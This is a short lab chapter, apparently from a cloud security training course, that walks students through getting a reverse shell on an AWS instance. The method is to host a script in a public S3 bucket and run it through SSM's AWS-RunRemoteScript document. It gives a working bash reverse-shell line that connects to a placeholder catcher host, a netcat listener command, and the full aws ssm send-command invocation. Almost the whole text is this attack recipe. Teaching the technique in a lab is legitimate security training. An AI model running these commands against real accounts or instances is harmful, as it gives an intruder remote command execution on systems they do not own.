# Reverse shell using a hosted shell script

## Introduction

As we can use SSM to execute commands, we can use it to obtain a shell on the remote system. Using the `AWS-RunRemoteScript` document we can execute a script hosted either on Github or an S3 bucket.

## What are we going to cover?

This chapter covers the capability of AWS SSM to pull a script hosted on the Internet and execute it on the target. We will use this to gain a reverse shell.

## Steps to achieve this (DEMO)

- Run these commands from the student machine.
  
- Create a S3 bucket, give it any name and upload the following as `reverse-shell-script.sh` to the bucket

```
#!/bin/bash
bash -i >& /dev/tcp/REVERSE-SHELL-CATCHER/9999 0>&1
```

- Make the file public
- On the machine where you will catch the reverse shell, start netcat

`nc -lvp 9999`

- Run the following command with the shell script S3 bucket path and the instance ID of the machine on which you want a reverse shell

`aws ssm send-command --document-name "AWS-RunRemoteScript" --instance-ids "INSTANCE-ID-HERE" --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"PATH-TO-S3-SHELL-SCRIPT\"}"],"commandLine":["/bin/bash NAME-OF-SHELL-SCRIPT"]}' --query "Command.CommandId"`

- A reverse shell will have connected to the netcat listener

## Additional references

- [AWS-RunRemoteScript Example](https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-remote-scripts.html)
